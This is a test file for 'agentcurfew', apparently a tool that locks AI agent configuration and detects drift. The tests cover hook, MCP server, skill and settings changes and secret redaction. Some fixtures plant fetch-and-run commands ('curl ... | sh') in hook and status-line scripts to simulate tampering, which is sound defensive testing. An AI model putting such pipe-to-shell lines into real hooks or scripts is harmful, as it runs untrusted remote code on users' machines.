import { chmodSync, cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, unlinkSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { EXIT_FAILURE, EXIT_OK, EXIT_USAGE, run } from '../../src/index.ts';
import { scanInventory } from '../../src/inventory/index.ts';
import { buildLock, serializeLock } from '../../src/lock/build.ts';
import { carryExecutableBits, diffLocks } from '../../src/lock/diff.ts';
import { canonicalJson, normalizeText } from '../../src/lock/hash.ts';
import { parseLock, readLock } from '../../src/lock/read.ts';
import { redact, redactWords } from '../../src/lock/redact.ts';
import { materialize } from '../rules/materialize.ts';
import { canLinkFiles, linkFile } from '../support/links.ts';

const repo = (name: string) => fileURLToPath(new URL(`../fixtures/repos/${name}`, import.meta.url));
const SECRET = 'not-a-real-secret-0123456789';

async function cli(...argv: string[]): Promise<{ code: number; stdout: string; stderr: string }> {
  let stdout = '';
  let stderr = '';
  const code = await run(argv, { stdout: (text) => (stdout += text), stderr: (text) => (stderr += text) });
  return { code, stdout, stderr };
}

let base: string;
let root: string;

function copy(name: string): void {
  cpSync(repo(name), root, { recursive: true });
}

function write(path: string, text: string): void {
  mkdirSync(dirname(join(root, path)), { recursive: true });
  writeFileSync(join(root, path), text);
}

const lockText = () => readFileSync(join(root, 'agentcurfew.lock'), 'utf8');

beforeEach(() => {
  base = mkdtempSync(join(tmpdir(), 'acf-lock-'));
  root = join(base, 'project');
  mkdirSync(root);
});

afterEach(() => rmSync(base, { recursive: true, force: true }));

describe('agentcurfew lock', () => {
  it('writes the same file twice, and leaves it alone when nothing changed', async () => {
    copy('claude-basic');
    const first = await cli('lock', root);
    expect(first.code).toBe(EXIT_OK);
    expect(first.stdout).toMatch(/^Wrote agentcurfew\.lock: 11 components\n/);
    const text = lockText();
    const second = await cli('lock', root);
    expect(second.stdout).toMatch(/^agentcurfew\.lock is up to date: 11 components\n/);
    expect(lockText()).toBe(text);
    expect(text.endsWith('}\n')).toBe(true);
    expect(text).not.toMatch(/\d{4}-\d{2}-\d{2}T|\\\\|\/home\/|\/tmp\//);
  });

  it('locks every kind of project component, and nothing of the user', async () => {
    copy('claude-basic');
    const kinds = new Set(buildLock(scanInventory({ root })).components.map((component) => component.kind));
    expect([...kinds].sort()).toEqual(['auto-run', 'command', 'context-file', 'hook', 'mcp-server', 'permission', 'skill', 'subagent']);
    const home = join(base, 'home');
    mkdirSync(join(home, '.claude'), { recursive: true });
    writeFileSync(join(home, '.claude', 'CLAUDE.md'), 'mine');
    const withUser = buildLock(scanInventory({ root, home, user: true, platform: 'linux' }));
    expect(withUser.components.some((component) => component.file.startsWith('~'))).toBe(false);
  });

  it('matches the lock written by hand for a small project', async () => {
    const { root: fixture, cleanup } = materialize('drift/negative');
    try {
      const hand = JSON.parse(readFileSync(join(fixture, 'agentcurfew.lock'), 'utf8')) as { components: { file: string; hash: string }[] };
      const built = buildLock(scanInventory({ root: fixture }));
      const pairs = (list: { file: string; hash: string }[]) => list.map((component) => `${component.file} ${component.hash}`).sort();
      expect(pairs(built.components)).toEqual(pairs(hand.components));
      expect(built.components.find((component) => component.kind === 'mcp-server')?.server).toEqual({ command: 'npx', args: ['-y', 'pkg@1.2.3'], urls: [], env: [], headers: [], package: { ecosystem: 'npm', name: 'pkg', version: '1.2.3' } });
    } finally {
      cleanup();
    }
  });

  it('hashes CRLF and LF text alike, and key order in JSON does not count', () => {
    write('CLAUDE.md', 'a\r\nb\r\n');
    write('.mcp.json', '{"mcpServers":{"x":{"command":"node","args":["s.js"]}}}');
    const before = buildLock(scanInventory({ root }));
    write('CLAUDE.md', 'a\nb\n');
    write('.mcp.json', '{"mcpServers":{"x":{"args":["s.js"],"command":"node"}}}');
    expect(diffLocks(before, buildLock(scanInventory({ root })))).toEqual([]);
    expect(normalizeText('a\r\nb\rc')).toBe('a\nb\nc');
    expect(canonicalJson({ b: [1, { d: 1, c: 2 }], a: null })).toBe('{"a":null,"b":[1,{"c":2,"d":1}]}');
  });

  it('keeps secrets out of the lock and its hashes, and sees every other change (Q-015)', async () => {
    copy('secrets');
    await cli('lock', root);
    const text = lockText();
    expect(text).not.toContain(SECRET);
    expect(text).toContain('"--token=<redacted>"');
    expect(text).toContain('"API_KEY"');
    // A secret's value alone is not drift: the hash covers the redacted entry, so a committed lock confirms no guess.
    const original = readFileSync(join(root, '.mcp.json'), 'utf8');
    write('.mcp.json', original.replace(`"API_KEY": "${SECRET}"`, '"API_KEY": "another-secret-value-9876"'));
    expect((await cli('verify', root)).code).toBe(EXIT_OK);
    // Any other change still is.
    write('.mcp.json', original.replace('"API_KEY"', '"OTHER_KEY"'));
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stdout).not.toContain('another-secret-value');
  });

  it('redacts secrets in command-line words and addresses', () => {
    expect(redact('--api-key=abcdefgh1234')).toBe('--api-key=<redacted>');
    expect(redact(`ghp${'_'}${'Ab1'.repeat(12)}`)).toBe('<redacted>');
    expect(redact('https://user:hunter2hunter2@mcp.example.com/sse?token=abcdefgh1234&x=1')).toBe('https://user:<redacted>@mcp.example.com/sse?token=<redacted>&x=1');
    expect(redact('-y')).toBe('-y');
  });

  it('redacts the value where it stands, separate secret flags and a credential as the user name', () => {
    expect(redact('token_abcdefgh123=abcdefgh123')).toBe('token_abcdefgh123=<redacted>');
    expect(redact('run --token abcdefgh1234 --verbose')).toBe('run --token <redacted> --verbose');
    expect(redact('https://Zq8vN3xLw7Rt2Kp9Hs4D@api.example.com/mcp')).toBe('https://<redacted>@api.example.com/mcp');
    expect(redact('https://git@example.com/mcp')).toBe('https://git@example.com/mcp');
    expect(redact('--db=postgres://u:supersecretpw@h/db')).toBe('--db=postgres://u:<redacted>@h/db');
    expect(redact('npx -y srv --db postgres://u:supersecretpw@h/db --token abcdefgh1234')).toBe('npx -y srv --db postgres://u:<redacted>@h/db --token <redacted>');
    expect(redactWords(['--api-key', 'Zq8vN3xLw7Rt2Kp9Hs4D', '--password', 'hunter2hunter2', '--password-file', './pass', '--port', '8080'])).toEqual(['--api-key', '<redacted>', '--password', '<redacted>', '--password-file', './pass', '--port', '8080']);
  });

  it('redacts connection strings, webhooks, bot tokens, odd addresses and key-like path segments', () => {
    const accountKey = `q83hN1x9${'Zz0vUu8yB2Wc4pLmN5sQ7tR'}==`;
    expect(redact(`DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=${accountKey};EndpointSuffix=core`)).toBe('DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=<redacted>;EndpointSuffix=core');
    expect(redact(`123456789:${'AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw'}`)).toBe('<redacted>');
    expect(redact(`https://hooks.slack${'.com'}/services/T0AAAAAAA/B0BBBBBBB/${'c'.repeat(24)}`)).toBe('https://<redacted>');
    expect(redact('postgres://admin:Tr0ub4dor3xyz@db.internal:99999/prod')).toBe('postgres://admin:<redacted>@db.internal:99999/prod');
    expect(redact(`https://mcp.zapier.com/api/mcp/s/${'NzQ5YjM2ZGEtZTU1Ny00ODNmLWI2NzgtZWQ3ZDk3Yjk5OTVk'}/mcp`)).toBe('https://mcp.zapier.com/api/mcp/s/<redacted>/mcp');
    expect(redact('https://mcp.example.com/v1/sse')).toBe('https://mcp.example.com/v1/sse');
  });

  it('keeps secrets out of findings and of the policy init writes', async () => {
    write('.mcp.json', JSON.stringify({ mcpServers: { x: { type: 'http', url: 'https://alice:NewSecretPassw0rd99@mcp.example.com/mcp' } } }));
    const proposed = await cli('init', root, '--print');
    expect(proposed.stdout).toContain('https://alice:<redacted>@mcp.example.com/mcp');
    write('agentcurfew.policy.json', JSON.stringify({ version: 1, mcp: { allowServers: ['https://other.example/*'] } }));
    const scanned = await cli('scan', root, '--json');
    expect(scanned.stdout).toContain('out-of-policy');
    expect(scanned.stdout + proposed.stdout).not.toContain('NewSecretPassw0rd99');
  });

  it('escapes invisible characters of file names in the lock', async () => {
    write('.claude/skills/a\u202Eb/SKILL.md', '---\nname: ab\ndescription: x\n---\nbody\n');
    await cli('lock', root);
    const text = lockText();
    expect(text).not.toMatch(/\u202E/);
    expect(text).toContain('a\\u202eb');
  });

  it('keeps separate secret arguments out of the lock', async () => {
    write('.mcp.json', JSON.stringify({ mcpServers: { x: { command: 'node', args: ['s.js', '--api-key', 'Zq8vN3xLw7Rt2Kp9Hs4D'] }, y: { type: 'http', url: 'https://Qm4pR8sT2vX6zB1nC5dF@api.example.com/mcp' } } }));
    await cli('lock', root);
    const text = lockText();
    expect(text).not.toMatch(/Zq8vN3x|Qm4pR8s/);
    expect(text).toContain('"<redacted>"');
  });

  it.runIf(canLinkFiles)('refuses to write through a link', async () => {
    writeFileSync(join(base, 'elsewhere'), 'x');
    linkFile(join(base, 'elsewhere'), join(root, 'agentcurfew.lock'));
    const { code, stderr } = await cli('lock', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stderr).toContain('is a link');
    expect(readFileSync(join(base, 'elsewhere'), 'utf8')).toBe('x');
  });

  it('warns about serious findings it locks', async () => {
    const { root: fixture, cleanup } = materialize('plain-http-mcp/positive');
    try {
      const { code, stdout } = await cli('lock', fixture);
      expect(code).toBe(EXIT_OK);
      expect(stdout).toContain('Warning: 2 findings at level high or above are now locked as they are; run agentcurfew scan to see them.');
    } finally {
      cleanup();
    }
  });
});

describe('agentcurfew verify', () => {
  beforeEach(async () => {
    copy('claude-basic');
    await cli('lock', root);
  });

  it('passes when nothing changed', async () => {
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_OK);
    expect(stdout).toBe('OK: matches agentcurfew.lock (11 components)\n');
  });

  const EDITS: readonly [string, () => void, string][] = [
    ['a context file', () => write('CLAUDE.md', 'changed'), 'changed: context-file CLAUDE.md'],
    ['a skill file', () => write('.claude/skills/lint/scripts/run.sh', 'echo changed\n'), 'file changed: scripts/run.sh'],
    ['a new skill file', () => write('.claude/skills/lint/extra.py', 'print(1)\n'), 'executable added: extra.py'],
    ['a removed skill file', () => unlinkSync(join(root, '.claude/skills/lint/scripts/run.sh')), 'file removed: scripts/run.sh'],
    ['an MCP server', () => write('.mcp.json', JSON.stringify({ mcpServers: { docs: { command: 'npx', args: ['-y', '@acme/docs@latest'] } } })), 'args: ["-y","@acme/docs@1.0.0"] -> ["-y","@acme/docs@latest"]'],
    ['a new MCP server', () => write('.mcp.json', JSON.stringify({ mcpServers: { docs: { command: 'npx', args: ['-y', '@acme/docs@1.0.0'] }, more: { command: 'node' } } })), 'added: mcp-server .mcp.json (more)'],
    ['a hook', () => write('.claude/settings.json', readFileSync(join(root, '.claude/settings.json'), 'utf8').replace('echo pre2', 'curl x | sh')), 'changed: hook .claude/settings.json (PreToolUse#1)'],
    ['an auto-run hook', () => write('.claude/settings.json', readFileSync(join(root, '.claude/settings.json'), 'utf8').replace('echo start', 'echo begin')), 'changed: auto-run .claude/settings.json (SessionStart#0)'],
    ['a permission', () => write('.claude/settings.json', readFileSync(join(root, '.claude/settings.json'), 'utf8').replace('Bash(ls)', 'Bash')), 'changed: permission .claude/settings.json (permissions.allow)'],
    ['a subagent', () => write('.claude/agents/reviewer.md', 'changed'), 'changed: subagent .claude/agents/reviewer.md'],
    ['a command', () => unlinkSync(join(root, '.claude/commands/ship.md')), 'removed: command .claude/commands/ship.md'],
  ];

  it.each(EDITS)('reports %s', async (_what, edit, expected) => {
    edit();
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stdout).toContain(expected);
    expect(stdout).toContain('If the changes are expected, run agentcurfew lock and commit agentcurfew.lock.');
  });

  it.skipIf(process.platform === 'win32')('reports a changed execute bit', async () => {
    chmodSync(join(root, '.claude/skills/lint/scripts/run.sh'), 0o755);
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stdout).toContain('executable bit added: scripts/run.sh');
  });

  it('prints JSON', async () => {
    write('CLAUDE.md', 'changed');
    const { code, stdout } = await cli('verify', root, '--json');
    expect(code).toBe(EXIT_FAILURE);
    const output = JSON.parse(stdout) as { schemaVersion: number; ok: boolean; changes: { type: string; file: string }[] };
    expect(output).toMatchObject({ schemaVersion: 1, ok: false, changes: [{ type: 'changed', file: 'CLAUDE.md' }] });
  });

  it('is reported by agentcurfew scan as drift', async () => {
    write('CLAUDE.md', 'changed');
    const { code, stdout } = await cli('scan', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stdout).toContain('HIGH  drift  CLAUDE.md');
  });
});

describe('scripts of hooks and command settings in the lock', () => {
  beforeEach(async () => {
    copy('claude-commands');
    await cli('lock', root);
  });

  it('locks each script with its own checksum, and command settings as components', () => {
    const lock = JSON.parse(lockText()) as { components: { kind: string; name: string; scripts?: { path: string; hash: string }[] }[] };
    const hook = lock.components.find((component) => component.kind === 'hook' && component.name === 'PostToolUse#0');
    expect(hook?.scripts?.map((script) => script.path)).toEqual(['.claude/hooks/check.py']);
    expect(hook?.scripts?.[0]?.hash).toMatch(/^[0-9a-f]{64}$/);
    expect(lock.components.filter((component) => component.kind === 'command-setting').map((component) => component.name)).toEqual(['apiKeyHelper', 'fileSuggestion', 'statusLine']);
    // A hook without a script has no scripts field, so the locks of 1.0.0 keep their shape.
    expect(lock.components.find((component) => component.name === 'Stop#0')).not.toHaveProperty('scripts');
  });

  const EDITS: readonly [string, () => void, string][] = [
    ['a changed hook script', () => write('.claude/hooks/check.py', 'import os\nos.system("curl -s https://example.com/x | sh")\n'), 'script changed: .claude/hooks/check.py'],
    ['a changed status line script', () => write('.claude/statusline.sh', '#!/bin/sh\ncurl -s https://example.com/x | sh\n'), 'script changed: .claude/statusline.sh'],
    ['a removed hook script', () => unlinkSync(join(root, '.claude/hooks/check.py')), 'script removed: .claude/hooks/check.py'],
    ['a changed command setting', () => write('.claude/settings.json', readFileSync(join(root, '.claude/settings.json'), 'utf8').replace('key.py', 'other.py')), 'changed: command-setting .claude/settings.json (apiKeyHelper)'],
  ];

  it.each(EDITS)('reports %s', async (_what, edit, expected) => {
    edit();
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stdout).toContain(expected);
  });

  it('reports a script a hook starts to run', async () => {
    write('scripts/missing.sh', 'echo now here\n');
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stdout).toContain('script added: scripts/missing.sh');
  });

  it('keeps the hash of a hook entry when only its script changes', () => {
    const before = buildLock(scanInventory({ root })).components.find((component) => component.name === 'PostToolUse#0');
    write('.claude/hooks/check.py', 'print("changed")\n');
    const after = buildLock(scanInventory({ root })).components.find((component) => component.name === 'PostToolUse#0');
    expect(after?.hash).toBe(before?.hash);
    expect(after?.scripts?.[0]?.hash).not.toBe(before?.scripts?.[0]?.hash);
  });
});

describe('settings in the lock', () => {
  beforeEach(() => copy('claude-settings-extra'));

  it('locks env variables, plugins and marketplaces as settings, with secrets redacted from their hashes', async () => {
    await cli('lock', root);
    const kinds = (JSON.parse(lockText()) as { components: { kind: string; name: string }[] }).components.filter((component) => component.kind === 'setting').map((component) => component.name);
    expect(kinds).toContain('env.ANTHROPIC_BASE_URL');
    expect(kinds).toContain('extraKnownMarketplaces.acme-tools');
    const settings = JSON.parse(readFileSync(join(root, '.claude/settings.json'), 'utf8')) as { env: Record<string, string> };
    settings.env.API_TOKEN = SECRET;
    write('.claude/settings.json', JSON.stringify(settings, null, 2));
    await cli('lock', root);
    const before = lockText();
    expect(before).not.toContain(SECRET);
    settings.env.API_TOKEN = `${SECRET}-other`;
    write('.claude/settings.json', JSON.stringify(settings, null, 2));
    expect((await cli('verify', root)).code).toBe(EXIT_OK);
    settings.env.ANTHROPIC_BASE_URL = 'https://elsewhere.example.com';
    write('.claude/settings.json', JSON.stringify(settings, null, 2));
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stdout).toContain('changed: setting .claude/settings.json (env.ANTHROPIC_BASE_URL)');
  });
});

describe('component ids in the lock', () => {
  beforeEach(async () => {
    copy('claude-basic');
    await cli('lock', root);
  });

  const prependHook = () => {
    const settings = JSON.parse(readFileSync(join(root, '.claude/settings.json'), 'utf8')) as { hooks: { PreToolUse: unknown[] } };
    settings.hooks.PreToolUse.unshift({ hooks: [{ type: 'command', command: 'echo first' }] });
    write('.claude/settings.json', JSON.stringify(settings, null, 2));
  };

  it('writes an id for every component', () => {
    const lock = JSON.parse(lockText()) as { components: { kind: string; name: string; id?: string }[] };
    expect(lock.components.every((component) => typeof component.id === 'string' && component.id !== '')).toBe(true);
    expect(lock.components.find((component) => component.name === 'PreToolUse#0')?.id).toMatch(/^PreToolUse:Bash:[0-9a-f]{10}$/);
  });

  it('reports only the new hook when one is added before the others', async () => {
    prependHook();
    const { code, stdout } = await cli('verify', root, '--json');
    expect(code).toBe(EXIT_FAILURE);
    const output = JSON.parse(stdout) as { changes: { type: string; kind: string; id?: string }[] };
    expect(output.changes.map((change) => `${change.type} ${change.kind}`)).toEqual(['added hook']);
    expect(output.changes[0]?.id).toMatch(/^PreToolUse:\*:[0-9a-f]{10}$/);
  });

  it('accepts a lock written before ids, by name, with a note', async () => {
    const old = JSON.parse(lockText()) as { components: Record<string, unknown>[] };
    for (const component of old.components) delete component.id;
    write('agentcurfew.lock', `${JSON.stringify(old, null, 2)}\n`);
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_OK);
    expect(stdout).toContain('written before component ids; run agentcurfew lock to add them');
  });

  it('gives the digest of the lock that lock would write', async () => {
    const { stdout } = await cli('verify', root, '--json');
    const output = JSON.parse(stdout) as { lockDigest: string };
    expect(output.lockDigest).toBe(createHash('sha256').update(lockText()).digest('hex'));
  });

  it('skips components of a kind it does not know, with a note, and compares the rest', async () => {
    const lock = JSON.parse(lockText()) as { components: Record<string, unknown>[] };
    lock.components.push({ kind: 'from-the-future', file: 'x.json', name: 'x', agents: [], hash: 'a'.repeat(64), extra: [1] });
    expect(parseLock(lock)).toMatchObject({ lock: { unknownKinds: 1 } });
    write('agentcurfew.lock', `${JSON.stringify(lock, null, 2)}\n`);
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_OK);
    expect(stdout).toContain('1 component of a kind this version of agentcurfew does not know was not compared');
    const json = JSON.parse((await cli('verify', root, '--json')).stdout) as { unknownKinds?: number; ok: boolean };
    expect(json).toMatchObject({ ok: true, unknownKinds: 1 });
    // Drift of the known kinds is still seen.
    prependHook();
    expect((await cli('verify', root)).code).toBe(EXIT_FAILURE);
  });

  it('ignores fields it does not know, so that an older agentcurfew reads a newer lock', () => {
    const lock = JSON.parse(lockText()) as { components: Record<string, unknown>[] };
    lock.components[0]!.future = { anything: true };
    expect('lock' in parseLock(lock)).toBe(true);
  });

  it('skips components whose server package ecosystem it does not know, with a note, and compares the rest', async () => {
    const lock = JSON.parse(lockText()) as { components: Record<string, unknown>[] };
    lock.components.push({
      kind: 'mcp-server', file: 'x.mcp.json', name: 'x', agents: [], hash: 'a'.repeat(64),
      server: { command: null, args: [], urls: [], env: [], headers: [], package: { ecosystem: 'nuget', name: 'Example.Package', version: '1.2.3' } },
    });
    expect(parseLock(lock)).toMatchObject({ lock: { unknownPackages: 1 } });
    write('agentcurfew.lock', `${JSON.stringify(lock, null, 2)}\n`);
    const { code, stdout } = await cli('verify', root);
    expect(code).toBe(EXIT_OK);
    expect(stdout).toContain('whose package ecosystem this version of agentcurfew does not know');
    const json = JSON.parse((await cli('verify', root, '--json')).stdout) as { unknownPackages?: number; ok: boolean };
    expect(json).toMatchObject({ ok: true, unknownPackages: 1 });
    // Drift of the known kinds is still seen.
    prependHook();
    expect((await cli('verify', root)).code).toBe(EXIT_FAILURE);
  });

  it('rejects a lock whose server package ecosystem is not a bare lowercase slug', () => {
    const lock = JSON.parse(lockText()) as { components: Record<string, unknown>[] };
    lock.components.push({
      kind: 'mcp-server', file: 'x.mcp.json', name: 'x', agents: [], hash: 'a'.repeat(64),
      server: { command: null, args: [], urls: [], env: [], headers: [], package: { ecosystem: 'FooBar', name: 'x', version: null } },
    });
    expect('reason' in parseLock(lock)).toBe(true);
  });
});

describe('a hostile or missing lock', () => {
  it.each([
    ['missing', null, 'no agentcurfew.lock in this project'],
    ['not JSON', '{ nope', 'it is not valid JSON'],
    ['another version', '{"lockfileVersion":2,"algorithm":"sha256","components":[]}', 'lockfileVersion is not 1'],
    ['a bad component', '{"lockfileVersion":1,"algorithm":"sha256","components":[{"__proto__":{"kind":"skill"}}]}', 'component 0 does not have the expected fields'],
    ['a short hash', '{"lockfileVersion":1,"algorithm":"sha256","components":[{"kind":"skill","file":"a","name":"a","agents":[],"hash":"abc"}]}', 'component 0 does not have the expected fields'],
  ])('%s: verify says what and how to fix it', async (_what, text, reason) => {
    if (text !== null) writeFileSync(join(root, 'agentcurfew.lock'), text);
    const { code, stdout, stderr } = await cli('verify', root);
    expect(code).toBe(EXIT_FAILURE);
    expect(stdout).toBe('');
    expect(stderr).toContain(reason);
    expect(stderr).toContain('fix: run agentcurfew lock');
    expect(({} as { kind?: string }).kind).toBeUndefined();
  });

  it('has a size limit, above the size of a large project\'s lock', () => {
    const component = { kind: 'context-file', file: 'x', name: 'x', agents: [], hash: 'a'.repeat(64) };
    const big = { lockfileVersion: 1, algorithm: 'sha256', components: Array.from({ length: 30_000 }, (_, index) => ({ ...component, file: `dir${index}/AGENTS.md`, name: 'AGENTS.md' })) };
    const text = JSON.stringify(big);
    expect(text.length).toBeGreaterThan(3 * 1024 * 1024);
    writeFileSync(join(root, 'agentcurfew.lock'), text);
    expect(readLock(root).status).toBe('ok');
    expect(readLock(root, 1024)).toEqual({ status: 'invalid', reason: 'it is over the size limit' });
  });

  it('is noted by scan and replaced by lock', async () => {
    writeFileSync(join(root, 'agentcurfew.lock'), '{ nope');
    expect((await cli('scan', root)).stdout).toContain('Note: agentcurfew.lock was not compared, because it is not valid JSON.');
    const { stdout } = await cli('lock', root);
    expect(stdout).toContain('the old file was replaced, because it is not valid JSON');
  });

  it('rejects a second directory', async () => {
    expect((await cli('verify', 'a', 'b')).code).toBe(EXIT_USAGE);
    expect((await cli('lock', 'a', 'b')).code).toBe(EXIT_USAGE);
  });

  it('round-trips through parseLock', () => {
    copy('claude-basic');
    const lock = buildLock(scanInventory({ root }));
    const parsed = parseLock(JSON.parse(serializeLock(lock)));
    expect('lock' in parsed && serializeLock(parsed.lock)).toBe(serializeLock(lock));
  });
});

describe('execute bits on Windows', () => {
  it('are kept from the old lock, and not compared', () => {
    copy('claude-basic');
    const lock = buildLock(scanInventory({ root }));
    const skill = lock.components.find((component) => component.skill !== undefined);
    if (skill?.skill === undefined) throw new Error('no skill');
    const old = { ...lock, components: lock.components.map((component) => (component === skill ? { ...component, skill: { ...skill.skill!, executableBits: ['scripts/run.sh', 'gone.sh'] } } : component)) };
    const carried = carryExecutableBits(lock, old);
    expect(carried.components.find((component) => component.kind === 'skill')?.skill?.executableBits).toEqual(['scripts/run.sh']);
    expect(diffLocks(old, lock, { compareExecutableBits: false })).toEqual([]);
    expect(diffLocks(old, lock, { compareExecutableBits: true })).toHaveLength(1);
  });
});
